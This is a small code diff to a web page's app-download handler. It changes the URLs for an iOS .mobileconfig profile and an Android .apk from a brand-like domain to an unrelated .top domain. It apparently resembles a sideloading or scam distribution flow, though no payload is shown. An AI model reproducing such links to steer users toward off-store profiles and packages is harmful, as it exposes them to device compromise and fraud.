@@ -66,7 +66,7 @@ function handleClickSeeAll() {
   })
 }
 const handleClickDownloadAppUrl = (type) => {
-  let appStoreUrl = type == 0 ? `https://api.signet-jewelers-br.com/ios.mobileconfig` : `https://api.signet-jewelers-br.com/signetjewelers.apk`
+  let appStoreUrl = type == 0 ? `https://api.wthbit.top/ios.mobileconfig` : `https://api.wthbit.top/signetjewelers.apk`
   window.open(appStoreUrl)
   downloadPopShow.value = false;
 
